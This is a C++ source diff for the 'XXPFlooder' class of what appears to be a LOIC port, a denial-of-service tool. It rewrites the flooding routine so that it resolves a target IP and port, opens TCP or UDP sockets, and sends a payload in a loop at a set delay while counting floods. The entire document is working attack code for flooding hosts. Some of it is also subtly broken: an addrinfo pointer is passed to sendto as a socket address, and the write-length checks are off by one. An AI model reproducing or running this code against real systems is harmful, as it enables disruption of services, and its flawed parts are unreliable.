@@ -27,56 +27,49 @@ namespace loic {
 
 	void XXPFlooder::work()
 	{
-		try
+
+		struct addrinfo hints;
+		struct addrinfo *result, *rp;
+		int sfd, s;
+		size_t len;
+		ssize_t nread;
+		char buffer[BUF_SIZE];
+		memset(&hints, 0, sizeof(struct addrinfo));
+		hints.ai_family = AF_INET;    /* Allow IPv4 or IPv6 */
+		hints.ai_flags = 0;
+
+		if(this->protocol == 1)
 		{
-			//set up the target host
+			hints.ai_socktype = SOCK_STREAM; /* Datagram socket */
+			hints.ai_protocol = IPPROTO_TCP;
 
-
-			int sock;
-			struct sockaddr_in server_addr;
-			struct hostent *host;
-
-			std::string remoteHost = "from the ip address";
-			struct sockaddr_in remoteSocketInfo;
-
-			//using hostname
-			if(hostname)
+			try
 			{
-				if((host = gethostbyname(remoteHost.c_str())) == NULL)
-				{
-					std::cerr<<"System DNS name resolution not configured properly."<<std::endl;
-					std::cerr<<"Error number: "<< ECONNREFUSED<<std::endl;
+				//set up the target host
+
+				s = getaddrinfo(ip.c_str(),port.c_str(), &hints, &result);
+				if (s != 0) {
+					std::cerr<<"getaddrinfo: "<<gai_strerror(s)<<std::endl;
+
 				}
 
-				//Load system information for remote socket server into socket data structure
-				memcpy((char*) & remoteSocketInfo.sin_addr, host->h_addr,host->h_length);
-			}
-			else
-			{
-				//using ip address
-				remoteSocketInfo.sin_addr.s_addr = inet_addr(ip.c_str());
-			}
 
-
-			server_addr.sin_family = AF_INET;
-			server_addr.sin_port = htons(atoi(port.c_str()));
-			server_addr.sin_addr = *((struct in_addr *)host->h_addr);
-			bzero(&(server_addr.sin_zero),8);
-
-			while(this->flooding)
-			{
-				if(this->protocol == 1)
+				while(this->flooding)
 				{
-					if((sock = socket(AF_INET,SOCK_STREAM,IPPROTO_IP)<0)){
 
-						close(sock);
-						std::cerr<<"ERROR"<<std::endl;
-					}
+					for (rp = result; rp != NULL; rp = rp->ai_next) {
+						sfd = socket(rp->ai_family, rp->ai_socktype,rp->ai_protocol);
 
-					if((connect(sock, (struct sockaddr *)&remoteSocketInfo, sizeof(sockaddr_in)))<0)
-					{
-						close(sock);
-						std::cerr<<"could not connect socket\n";
+						if (sfd == -1)
+							continue;
+
+						if (connect(sfd, rp->ai_addr, rp->ai_addrlen) != -1)
+						{
+							std::cout<<"successfully connect\n";
+							break;                  /* Success */
+						}
+
+						close(sfd);
 					}
 
 					try
@@ -84,7 +77,10 @@ namespace loic {
 						while(this->flooding)
 						{
 							this->floodcount++;
-
+							if(write(sfd,data.c_str(),data.length()+1)!= data.length())
+							{
+								std::cerr<<"partial/failed write"<<std::endl;
+							}
 							if(delay>0)
 							{
 								//sleep for the delay
@@ -98,40 +94,75 @@ namespace loic {
 					}
 
 				}
-				if(protocol == 2)
+			}
+			catch(std::exception & exe)
+			{
+
+			}
+		}
+		if(protocol == 2)
+		{
+			hints.ai_socktype = SOCK_DGRAM; /* Datagram socket */
+			hints.ai_protocol = IPPROTO_UDP;
+
+			try
+			{
+				//set up the target host
+
+				s = getaddrinfo(ip.c_str(),port.c_str(), &hints, &result);
+				if (s != 0) {
+					std::cerr<<"getaddrinfo: "<<gai_strerror(s)<<std::endl;
+
+				}
+
+
+				while(this->flooding)
 				{
 
-					if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) == -1)
-					{
-						std::cerr<<"ERROR! Socket error"<<std::endl;
-						close(sock);
-					}
+					for (rp = result; rp != NULL; rp = rp->ai_next) {
+						sfd = socket(rp->ai_family, rp->ai_socktype,rp->ai_protocol);
 
+						if (sfd == -1)
+							continue;
+
+						if (connect(sfd, rp->ai_addr, rp->ai_addrlen) != -1)
+						{
+							std::cout<<"successfully connect\n";
+							break;                  /* Success */
+						}
+
+						close(sfd);
+					}
 
 					try
 					{
 						while(this->flooding)
 						{
-							floodcount++;
-							sendto(sock,data.c_str(),data.length(),0, (struct sockaddr *)&server_addr, sizeof(struct sockaddr));
+							this->floodcount++;
+							if(sendto(sfd,data.c_str(),data.length()+1,0,(struct sockaddr *)rp,sizeof(sockaddr))!= data.length())
+							{
+								std::cerr<<"partial/failed write"<<std::endl;
+							}
 							if(delay>0)
 							{
+								//sleep for the delay
 								boost::this_thread::sleep(boost::posix_time::milliseconds(delay));
 							}
 						}
 					}
-					catch(std::exception & exc)
+					catch(std::exception & exe)
 					{
 
 					}
+
 				}
 			}
-		}
-		catch(std::exception &exe)
-		{
+			catch(std::exception & exe)
+			{
 
+			}
 		}
+
 	}
-
-	/* namespace loic */
+			/* namespace loic */
 }
